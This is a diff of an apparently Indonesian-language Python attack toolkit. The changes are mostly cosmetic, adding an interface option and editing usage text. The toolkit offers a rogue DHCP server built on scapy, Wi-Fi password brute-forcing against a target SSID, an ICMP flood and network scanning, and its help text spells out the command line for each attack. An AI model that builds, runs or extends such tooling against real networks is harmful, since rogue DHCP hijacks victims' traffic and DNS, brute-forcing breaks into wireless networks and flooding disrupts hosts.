@@ -1,5 +1,3 @@
-#!/home/kali/Documents/projo/src/bin/python
-
 import pywifi
 from pywifi import PyWiFi
 from pywifi import const
@@ -74,7 +72,7 @@ class RogueDHCP:
                 sendp(ether / ip / udp / bootp / dhcp, iface=self.iface, verbose=0)
 
     def run(self):
-        print("[*] Rogue DHCP Server berjalan...")
+        print("Rogue DHCP Server berjalan...")
         sniff(filter="udp and (port 67 or 68)", prn=self.handle_dhcp, store=0, iface=self.iface)
 
 def cracking(ssid, wordlist):
@@ -108,13 +106,13 @@ def scan_wifi():
     print("Scanning for wifi devices")
     print("Please Wait")
     
-    wifi = PyWiFi()  # Membuat objek PyWiFi
-    iface = wifi.interfaces()[0]  # Mengambil interface pertama (biasanya WiFi)
+    wifi = PyWiFi()  
+    iface = wifi.interfaces()[0]  
     
-    iface.scan()  # Mulai scan
-    time.sleep(5)  # Tunggu hasil scan
+    iface.scan()  
+    time.sleep(5)  
     
-    results = iface.scan_results()  # Ambil hasil scan
+    results = iface.scan_results()
 
     available_devices = []
 
@@ -161,7 +159,7 @@ def scan_ip(gateway):
     res.append({'ip': received.psrc, 'mac': received.hwsrc, 'vendor': vendor})
 
   if len(res) == 0:
-    print('IP Address tidak ditemukan. coba periksa IP Gateway')
+    print('[!]IP Address tidak ditemukan. coba periksa IP Gateway')
     sys.exit()
   else:
     pass
@@ -218,6 +216,7 @@ def main():
  print()
  print("Untuk Bruteforce Wifi password:")
  print("Untuk scan Wi-Fi: python3 run.py --c scan_wifi_lists ")
+ print("sudo bin/python run.py --c scan_wifi_lists")
  print("Untuk melakukan serangan brute force Wi-Fi : python3 run.py --c crack_wifi_password --s TARGET_WIFI --w WORDLIST.txt")
  print()
  print("Untuk ICMP Flood:")
@@ -225,7 +224,7 @@ def main():
  print("Untuk melakukan serangan ICMP : python3 run.py --c icmp_attack --ip TARGET_IP --loop JUMLAH_PAKET_DIKIRIM")
  print()
  print("Untuk DHCP Rogue:")
- print("Untuk melakukan serangan: python3 run.py --c dhcp_rogue --ip ATTACKER_IP --g GATEWAY --d DNS_IP --sub SUBNET_MASK --lt LEASE_TIME")
+ print("Untuk melakukan serangan: python3 run.py --c dhcp_rogue --ip ATTACKER_IP --g GATEWAY --d DNS_IP --sub SUBNET_MASK --lt LEASE_TIME(432000 --i INTERFACE")
 
  parser = argparse.ArgumentParser()
  parser.add_argument('--loop', help='Gateway target untuk scan ip. cara penggunaan: --gateway 192.168.1.1/24')
@@ -236,6 +235,7 @@ def main():
  parser.add_argument('--lt', help='Lease time untuk DHCP rogue. cara penggunaan: --lt 43200')
  parser.add_argument('--s', help='SSID target (hanya untuk mode brute)')
  parser.add_argument('--w', help='Path ke file wordlist (hanya untuk mode brute)')
+ parser.add_argument('--i', help='Interface atau hardware penghubung')
  parser.add_argument("--c", choices=['scan_wifi_lists', 'crack_wifi_password', 'scan_ip', 'icmp_attack', 'dhcp_rogue'], help="Aksi yang ingin dilakukan")
  args = parser.parse_args()
 
@@ -256,7 +256,7 @@ def main():
   dns_s = args.d
   sub = args.sub
   lt = args.lt
-  iface = "wlp2s0"
+  iface = args.i
   
   dhcp_server = RogueDHCP(target_ip, gateway, dns_s, sub, lt, iface, splitted)
   dhcp_server.run()
